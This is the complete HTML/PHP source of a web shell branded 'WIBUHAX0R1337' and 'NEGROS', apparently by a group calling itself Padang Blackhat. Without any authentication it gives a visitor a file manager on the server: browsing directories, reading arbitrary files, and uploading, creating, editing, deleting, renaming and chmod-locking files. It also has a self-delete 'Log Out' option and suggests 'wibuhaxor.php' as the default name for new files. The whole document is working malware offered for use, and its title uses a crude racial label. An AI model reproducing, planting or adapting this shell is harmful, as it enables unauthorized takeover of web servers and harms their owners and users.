<html>
<head>
<title>- negros -</title>
<meta name="robots" content="noindex,nofollow">
<meta name="description" content=" orang kulit hitam ><">
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<style>
	body {
        font-family: 'Ubuntu', sans-serif;
	background-color: black;
        color: #00BFFF;
    	background-size:cover;
        background-attachment: fixed;
	}

	body h1{
		color: #00BFFF;
		text-shadow: 2px 2px 2px #00BFFF;
font-family: 'Roboto', sans-serif;

		font-size: 50px;
 font-family: cursive;
		font-family: 'Cuprum', sans-serif;
	}
.dir {
		text-align: center;
		font-size: 30px;
	}
	.dir a{
		text-decoration: none;
		color: #00BFFF;
		text-shadow: 1px 1px 1px #00BFFF;

	}
	.dir a:hover{
		text-decoration: none;
		color: #00BFFF;
	}
a {
  max-width: 100%;
  word-wrap: break-word;
  overflow: hidden;
  text-overflow: ellipsis;
}
a:hover {
    color: #00BFFF;
    text-decoration: none;
}
table {
    width: 100%;
  max-width: 100%;
  margin-bottom: 1rem;
  background-color: transparent;
border-collapse: collapse;
    font-size: 30px;
    
}

table, th {
    border: 3px solid #FF1493;
    box-sizing: border-box;
    padding: 8px 2px;
    color: #00BFFF;
    text-shadow: 1px 1px 1px #FF1493;
}

table, td {
    border: 3px solid #FF1493;
    box-sizing: border-box;
    padding: 8px 8px;
    color: #00BFFF;
}

table td a {
    text-decoration: none;
    color: #00BFFF;
    text-shadow: 1px 1px 1px #FF1493;
}

table td a:hover {
    text-decoration: none;
    color: #00BFFF;
}
input {
  background-color: black;
  font-family: monospace;
  font-size: 15px;
  color: #00BFFF;
  border: 2px solid #FF1493;
  text-shadow: 5px 5px 30px #FF1493;
  box-sizing: border-box;
  width: 100%;
  padding: 10px;
  margin-bottom: 10px;
}
.button1 {
  display: inline-block;
  margin: 10px 3px;
  padding: 5px;
  color: #00BFFF;
  background-color: black;
  border-radius: 5px;
  border: 3px solid #FF1493;
  box-shadow: .5px .5px .3px .3px #FF1493;
  box-sizing: border-box;
  text-align: center;
  text-decoration: none;
}
.button1 a {
  display: block;
  width: 100%;
  height: 100%;
  padding: 5px;
  color: #00BFFF;
  text-decoration: none;
  box-sizing: border-box;
}
.button1:hover {
  text-shadow: 1px 1px 1px #00FF7F;
  box-shadow: .5px .5px .3px .3px #FF1493;
}
textarea {
		border: 3px solid #FF1493;
		border-radius: 5px;
		box-shadow: 1px 1px 1px 1px #FF1493;
		width: 98%;
		height: 400px;
		padding-left: 10px;
		margin: 10px auto;
		resize: none;
		background: black;
		color: #00BFFF;
		font-family: 'Cuprum', sans-serif;
		font-size: 13px;
	}
@media screen and (max-width: 600px) {
    a {
        display: block;
        width: 100%;
        text-align: center;
        margin-bottom: 10px;
    }
}

	
@media screen and (min-width: 768px) {
  input {
    width: 50%;
  }
}


@media screen and (max-width: 600px) {
  .button1 {
    width: 100%;
    height: auto;
    padding: 0;
  }
}
</style>
<body>
<br>
<div class="dir">
<b>- <font face="Kelly Slab" color="white" size="10">WIBUHAX0R1337 </font> -</b>
<br>
<?php
error_reporting(0);
ob_start();
session_start();
set_time_limit(0);
ini_set("memory_limit",-1);
ini_set('session.use_cookies', 0);
ini_set('session.use_only_cookies', 0);
ini_set('session.use_trans_sid', 0);

	if (isset($_GET['dir'])) {
			$dir = $_GET['dir'];
		} else {
			$dir = getcwd();
		}

		$dir = str_replace("\\", "/", $dir);
		$dirs = explode("/", $dir);

		foreach ($dirs as $key => $value) {
			if ($value == "" && $key == 0){
				echo '<i class="fa fa-folder-o"></i> : <a href="/"><font color="#FF1493">/</a>'; continue;
			} echo '<a href="?dir=';

			for ($i=0; $i <= $key ; $i++) { 
				echo "$dirs[$i]"; if ($key !== $i) echo "/";
			} echo '">'.$value.'</a>/';
	}
echo"</font>";
echo"[<a href='?'> Home </a>]";
echo"<br>";
echo"<a href='?dir=$dir&wibu=wibufolder'class='button1'>Create Folder</a>";
echo"<a href='?dir=$dir&wibu=wibufile' class='button1'>Create File</a>";
echo"<a href='?dir=$dir&wibu=lockfile' class='button1'>Lock File</a>";
echo"<a href='?dir=$dir&wibu=seocheck' class='button1'>SEO</a>";
echo"<a href='?wibu_about' class='button1'>About us</a>";


?>
<br>
<br>
<form enctype="multipart/form-data" method="post">
<input type="file" name="upfile">
<input type="submit" name="up" value="Uploaded ! ">
</form>
<?php
if(isset($_POST['up'])){
	$uploadfile = $_FILES['upfile']['name'];
if(move_uploaded_file
($_FILES['upfile']['tmp_name'],$dir.'/'.$_FILES['upfile']['name'])){
echo"<br>File was successfully uploaded ! ";
}
else {
    echo "<br>Upload failed ! ";
    
	} 
	
}
?>
<table>
	<tr>
		<th>Nama File / Folder</th>
		<th>Size</th>
		<th>Action</th>
	</tr>
	<?php
	$scan = scandir($dir);

foreach ($scan as $directory) {
	if (!is_dir($dir.'/'.$directory) || $directory == '.' || $directory ==
'..') continue;

	echo '
	<tr>
	<td><a
href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a></td>
	<td><center>--</center></td>
	<td><center>NONE</center></td>
	</tr>
	';
	} 
foreach ($scan as $file) {
	if (!is_file($dir.'/'.$file)) continue;

	$jumlah = filesize($dir.'/'.$file)/1024;
	$jumlah = round($jumlah, 3);
	if ($jumlah >= 1024) {
		$jumlah = round($jumlah/1024, 2).'MB';
	} else {
		$jumlah = $jumlah .'KB';
	}

	echo '
	<tr>
	<td><a
href="?dir='.$dir.'&open='.$dir.'/'.$file.'">'.$file.'</a></td>
	<td>'.$jumlah.'</td>
	<td>
<a href="?dir='.$dir.'&ubah='.$dir.'/'.$file.'"
class="button1">Edit File</a>
<a href="?dir='.$dir.'&delete='.$dir.'/'.$file.'"
class="button1">Delete File</a>
<a href="?dir='.$dir.'/'.$file.'&wibu=rename"
class="button1">Rename</a>
	</td>
	</tr>
	';
}
if (isset($_GET['open'])) {
	echo '
	<br />
	<style>
		table {
			display: none;
		}
	</style>
	<textarea>'.htmlspecialchars(file_get_contents($_GET['open'])).'</textarea>
	';
}

if (isset($_GET['delete'])) {
	if (unlink($_GET['delete'])) {
		echo
"<script>alert('dihapus');window.location='?dir=".$dir."';</script>";
	}
}
if (isset($_GET['ubah'])) {
echo "<span><font color='#FF1493'>Open File :</font>
".basename($_GET['ubah'])."</span>";
	echo '<style>
			table {
				display: none;
			}
		</style>
		
		<form method="post">
		<input type="hidden" name="object"
value="'.$_GET['ubah'].'">
		<textarea
name="edit">'.htmlspecialchars(file_get_contents($_GET['ubah'])).'</textarea>
		<center>
<input type="submit" name="dir_rename"  value="Save Edit !">

</center>
		</form>
		';
}
if (isset($_POST['edit'])) {
	$data = fopen($_POST["object"], 'w');
	if (fwrite($data, $_POST['edit'])) {
echo"<center>Edit File : Successful !!</center>";
		
	} else {
		echo "<script>alert(' Edit File : Unsuccessful !');</script>";
	}
}
		
else if(isset($_REQUEST['wibu_about']))
{
    wibu_about();
}

elseif($_GET['wibu'] == 'wibufile') {
echo "<form method='post'>
Create File :
<input type='text' name='s' value='wibuhaxor.php'>
<textarea name='text'></textarea>
<input type='submit' name='addfile'  value='Create File !'>
</form><br>";
    if (isset($_POST['addfile'])) {
$mkdir = fopen($_GET['dir'] . '/' . $_POST['s'], 'w');
fwrite ($mkdir, $_POST['text']);
chmod($mkdir, 0777); 
if (!file_exists($mkdir)) {
                echo '<br>Create File : Successful !';
            } 
else {
                echo '<br>Create File : Unsuccessful !';
            }	

fclose($mkdir);
}
}
elseif($_GET['wibu'] == 'wibufolder') {
echo "<form method='post'>Create Folder : 
<input type='text' name='okfolder' value='WIBUHAXOR_FOLDER'><br>
<input type='submit' name='addfolder'  value='Creat Folder !'>
</form><br>";
if(isset($_POST['addfolder'])){
$okfolder =$_GET['dir'] . '/'. $_POST['okfolder'];
if(!empty($okfolder)){
$fd=mkdir($okfolder, 0777);
echo"<br>Create Folder : Successful !";
}
else{
echo "<br>Create Folder : Unsuccessful !";
}
}
}
elseif($_GET['wibu'] == 'lockfile') {
echo"
<form method='post'>
File Name : 
<input type='text' name='lockedfile'>
<input type='submit' name='locked' value='Lock File ! '>
</form><br>";
if(isset($_POST['locked'])){
  $name = $_GET['dir'] . '/'. $_POST['lockedfile'];
chmod($name,0444); 
  if ($name) {
    echo"<center>Lock File : Successful !  - $name</center>";
  } else {
    echo "Lock File : Unsuccessful !";
  }
}
}
elseif($_GET['wibu'] == 'seocheck') {
echo "<br><iframe id='content' name='content' style='width: 98%; height: 500px; overflow-x: hidden; overflow-y: scroll;' src='https://www.google.com/search?igu=1&ei=&q=site%3A".$_SERVER['HTTP_HOST']."'><p>Your browser does not support iframes.</p></iframe>";
echo"<br>";
}


elseif($_GET['wibu'] == 'rename') {
echo "
<form method='post'>Rename : 
<input type='text' value='".basename($dir)."' name='fol_rename'>
<input type='submit' name='dir_rename' value='Rename !'>
</form><br>";
if(isset($_POST['dir_rename'])) {
$dir_rename = rename($dir,
"".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
if($dir_rename) { 
echo"<br>Rename File : Successful !";
}
else {
echo"<br>Rename File : Unsuccessful !";
}
}
}
?>
<?php
			if (isset($_GET['die'])) {
				?>
					<form action=""
method="POST"><center><br><br>
						<font>You Sure ?</font><br><br><input
type="submit" name="fuckoff" value="Yes"
/>
					</form>
				<?php

				if (isset($_POST['fuckoff'])) {
					if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) {
						die('<font><br>Thanks :*<br>See you
again</span>');}
				}
			}
		?>
<?php

function wibu_about()
{
    echo"
    <h4 >NEGROS</h4>
<hr color='#FF1493' width='60%'>
<div style='text-align: left;'>
<font size='5px' color='#FF1493'>Author : </font>
 <font size='5px'>Lutfifakee</font><br>
<font size='5px' color='#FF1493'>My Team : </font>
 <font size='5px'>Padang Blackhat</font><br>
<font size='5px' color='#FF1493'>My Website : </font>
 <font size='5px'>padang-blackhat.my.id</font><br>
<font size='5px' color='#FF1493'>Instagram : </font>
 <font size='5px'>Padangblackhat.id</font><br>
<font size='5px' color='#FF1493'>My Friends : </font>
 <font size='5px'>Zyy - PeluangX7 - IkhwanGanz - Starx - <font color='#FF1493'>
Lutfifakee</font> - Tn.Fotolia/Tn.Fotolio - NekelL - Clan_x7.</font>
</div>
<br>";
}
?>
</table>
<br>
<footer>NEGROS. <a href='?die'> Log Out</a>
</footer>
<hr color='#FF1493' width='60%'>
</body>
</html>